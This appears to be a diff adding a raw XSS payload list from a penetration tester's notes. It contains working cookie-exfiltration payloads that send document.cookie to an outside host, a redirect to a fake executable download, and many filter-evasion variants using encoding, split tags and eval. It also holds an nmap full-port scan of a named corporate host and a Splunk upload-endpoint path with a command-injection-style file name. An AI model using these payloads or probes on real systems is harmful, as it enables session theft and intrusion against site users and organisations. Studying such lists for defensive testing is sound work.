@@ -1,0 +1,58 @@
+"><script>document.location="http://localhost:8000/index.php?cookie="+document.cookie;</script>
+<button id=xss onfocus=location.replace("http://localhost") autofocus></button>
+
+<button+id=xss+onfocus=location.replace("http://10.144.154.52:8000/index.html")+autofocus></button>
+<meta http-equiv="refresh" content="0; url=http://localhost:8000/index.php?cookie=+document.cookie;>
+"><script>window.location='http://localhost:8000/fishing/test.exe'</script>
+<img+src+onmouseover=document.location="http://localhost:8000/index.php?cookie="+document.cookie;>
+<img src onerror='document.location.href="http://localhost">"></noembed>
+<button+onfocus=location.href='http://localhost:8000/index.php?cookie="+document.cookie;/>
+</textarea><script>fetch("http://localhost:8000/fishing/index.php="document.cookie)</script>
+<meta http-equiv="refresh" content="0; url=localhost/test.html">
+%22%3e%cscscriptript%3ewindow.location='localhost'%3c/scscriptript%3e
+<img src="#" onmouseover="alert(XSS_TEST);">
+<img src="#" onmouseover=document.location="http://localhost:8000/index.php?cookie=+document.cookie;>
+<p onclick=prompt("XSS_TEST")>xsstest</p>
+<img src/onerror=alert('xss')>
+"><button onfocus=alert('xss')autofocus/>
+"><button onerror=alert('xss')oneeror/>
+";}}/*/if(1){alert("xss_test");//
+<a onclick=alert("XSS_TEST")>>
+<p><a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>TEST</a></p>
+<button id=xss onfocus="alert
+"'><svg/webtest=""onload=alert(1)(1);document.getElementById('xss').blur();" autofocus></button>
+<img src=1 onclick=prompt(document.cookie)>
+"><noembed><img title="</noembed><img src onerror=alert(1)"></noembed>
+\"><img+src=x+onwheel=confirm(\"XSS_TEST\")>
+\"><img+src=x+OnWheel=ConFirM(\"XSS_TEST\")>
+<img src=x onkeydown="alert(document.cookie)">
+['"><input type="text" onmouseover="confirm(document.cookie)"style="height:1000px: width:1000px" name="test[']
+%22%3e%3cimg+src=x+onclick=confirm%60XSS_TEST%60%3e
+"><scscriptript>alert(1)</scscriptript>
+<input id=attack onfocus="alert(1);document.getElementById('attack').blur();">
+\"><img src=1 onerror=prompt(1)>//
+\"><img src=1 onmouseover=alert("XSS")>//
+ javascript:eval(String.fromcharCode(97,108,101,114,116,40,49,41))
+&quot;&gt;&lt;button onfocus=alert(&#39;xss&#39;)autofocus/&gt;
+&#x3C;img+src=x+onerror=alert(1)>
+<img+src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXBOPg==">
+<meta http-equiv="refresh" conten="0;url=javascript:alert("XSS")">
+
+"<a href=\"javascript:alert('xss_test')\">취약점 점검</a>
+
+<script>var+payload='\u003cimg+src=x+onerror=alert(1)\u003e';document.write(payload);</script>
+![alert+text](javascript:alert(1))
+<svg+onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+&#x3C;script&#X3E;alert(1)&#x3C;/script&#x3E;
+<img+src=\"x\"+OnError=\":alert('XSS')\">
+<div onwheel="alert('xss')">XSS</div>
+nmap -sS -sV -T3 --version-light -p- --open mcslog.skhynix.com
+
+<div oncut="alert('xss')">cut this text</div>
+<script>document.location="http://localhost:8000/index.php?cookie="+document.cookie;</script>
+<object data="datatext/html;base64,HNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="></object>
+
+
+/ko-KR/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=SKhy_VulnTeam_TEST%5BCMD%5D.jsp
+1724732223.39015226_AA8078D3-E33E-44E3-9ADE-71A6EF92910E
